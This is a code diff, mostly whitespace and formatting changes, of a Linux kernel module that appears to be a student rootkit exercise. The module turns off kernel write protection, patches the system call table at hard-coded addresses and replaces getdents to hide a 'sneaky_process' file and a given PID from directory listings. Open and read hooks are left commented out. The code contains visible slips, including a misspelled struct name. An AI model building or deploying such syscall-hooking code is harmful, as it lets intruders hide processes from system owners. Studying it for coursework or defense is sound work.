@@ -1,16 +1,17 @@
-#include <linux/module.h>      // for all modules 
-#include <linux/init.h>        // for entry/exit macros 
-#include <linux/kernel.h>      // for printk and other kernel bits 
-#include <asm/current.h>       // process information
-#include <linux/sched.h>
-#include <linux/highmem.h>     // for changing page permissions
-#include <asm/unistd.h>        // for system call constants
-#include <linux/kallsyms.h>
-#include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <asm/current.h>  // process information
+#include <asm/page.h>
+#include <asm/unistd.h>     // for system call constants
+#include <linux/highmem.h>  // for changing page permissions
+#include <linux/init.h>     // for entry/exit macros
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>  // for printk and other kernel bits
+#include <linux/module.h>  // for all modules
+#include <linux/sched.h>
 
-static char *mypid = "";
-module_param(mypid, charp, 0);;
+static char * mypid = "";
+module_param(mypid, charp, 0);
+;
 MODULE_PARM_DESC(mypid, "current pid of the sneaky process");
 
 struct linux_dirent {
@@ -32,31 +33,35 @@ struct linux_dirent {
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073100;
+void (*pages_rw)(struct page * page, int numpages) = (void *)0xffffffff81073190;
+void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff81073100;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
+static unsigned long * sys_call_table = (unsigned long *)0xffffffff81a00280;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*original_sys_open)(const char *pathname, int flags);
-asmlinkage ssize_t (*original_sys_read)(int fd, void *buf, size_t count);
+asmlinkage int (*original_sys_getdents)(unsigned int fd,
+                                        struct linux_dirent * dirp,
+                                        unsigned int count);
+asmlinkage int (*original_sys_open)(const char * pathname, int flags);
+asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
-asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage int sneaky_sys_getdents(unsigned int fd,
+                                   struct linux_dirent * dirp,
+                                   unsigned int count) {
   int nread = original_sys_getdents(fd, dirp, count);
   int bpos;
-  for(bpos = 0; bpos < nread;){
-    struct linux_dirend *d = (void*)dirp + bpos;
-    if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, mypid) == 0){
-      void *next = (void*)d + d->d_reclen;
-      int to_move = (void*)dirp + nread - next;
+  for (bpos = 0; bpos < nread;) {
+    struct linux_dirend * d = (void *)dirp + bpos;
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, mypid) == 0) {
+      void * next = (void *)d + d->d_reclen;
+      int to_move = (void *)dirp + nread - next;
       memmove(d, next, to_move);
       nread -= d->d_reclen;
       continue;
@@ -80,9 +85,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
 }
 */
 //The code that gets executed when the module is loaded
-static int initialize_sneaky_module(void)
-{
-  struct page *page_ptr;
+static int initialize_sneaky_module(void) {
+  struct page * page_ptr;
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
@@ -100,7 +104,7 @@ static int initialize_sneaky_module(void)
   //table with the function address of our new code.
 
   //"getdents" system call
-  original_sys_getdents = (void*)*(sys_call_table + __NR_getdents);
+  original_sys_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   /*
   //"open" system call
@@ -115,15 +119,13 @@ static int initialize_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  return 0;       // to show a successful load 
-}  
+  return 0;  // to show a successful load
+}
 
+static void exit_sneaky_module(void) {
+  struct page * page_ptr;
 
-static void exit_sneaky_module(void) 
-{
-  struct page *page_ptr;
-
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -145,9 +147,7 @@ static void exit_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-}  
+}
 
-
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
-
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
